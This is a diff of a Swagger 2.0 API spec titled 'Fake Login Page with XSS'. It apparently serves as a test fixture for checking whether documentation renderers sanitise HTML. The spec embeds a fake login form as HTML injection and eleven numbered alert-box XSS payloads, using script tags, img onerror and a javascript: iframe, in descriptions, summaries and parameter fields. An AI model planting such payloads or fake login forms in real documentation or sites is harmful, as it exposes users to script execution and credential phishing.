@@ -2,52 +2,51 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Fake Login Page with XSS
-  description: |
-    <div class="login-form">
-      <div class="heading">
+  description: '<div class="login-form">
+    <div class="heading">
         <h1>HTML Injection : Fake Login</h1>
-      </div>
-      <div class="form-container">
-        <form action="https://example.com/login" method="post" class="form-signin">
-          <div class="form-group">
-            <label for="username">Username</label>
-            <input type="text" name="username" size="20">
-          </div>
-          <div class="form-group">
-            <label for="password">Password</label>
-            <input type="password" name="password" size="20">
-          </div>
-          <div class="form-group">
-            <button type="submit" class="btn btn-default">Login</button>
-          </div>
-        </form>
-      </div>
     </div>
-    <script>alert("XSS1: Global Description");</script>
-    <img src="x" onerror="alert('XSS2: Image Error')">
-    <iframe src="javascript:alert('XSS3: Iframe Src')"></iframe>
+    <div class="form-container">
+        <form action="https://example.com/login" method="post" class="form-signin">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" name="username" size="20">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" name="password" size="20">
+            </div>
+            <div class="form-group">
+                <button type="submit" class="btn btn-default">Login</button>
+            </div>
+        </form>
+    </div>
+</div>
+<script>alert("XSS1: Global Description");</script>
+<img src="x" onerror="alert(''XSS2: Image Error'')">
+<iframe src="javascript:alert(''XSS3: Iframe Src'')"></iframe>'
 paths:
   /:
     post:
-      summary: <script>alert("XSS4: Post Summary");</script>
-      description: <script>alert("XSS5: Post Description");</script>
+      summary: '<script>alert("XSS4: Post Summary");</script>'
+      description: '<script>alert("XSS5: Post Description");</script>'
       parameters:
         - name: username
           in: formData
           type: string
-          description: <script>alert("XSS6: Username Param");</script>
+          description: '<script>alert("XSS6: Username Param");</script>'
         - name: password
           in: formData
           type: string
-          description: <script>alert("XSS7: Password Param");</script>
+          description: '<script>alert("XSS7: Password Param");</script>'
       responses:
         '200':
-          description: Login successful <script>alert("XSS8: Response Desc");</script>
+          description: 'Login successful <script>alert("XSS8: Response Desc");</script>'
     get:
-      summary: <script>alert("XSS9: Get Summary");</script>
-      description: <script>alert("XSS10: Get Description");</script>
+      summary: '<script>alert("XSS9: Get Summary");</script>'
+      description: '<script>alert("XSS10: Get Description");</script>'
       responses:
         '200':
-          description: Get successful <img src="x" onerror="alert('XSS11: Get Response')">
+          description: 'Get successful <img src="x" onerror="alert(''XSS11: Get Response'')">'
 schemes:
   - http
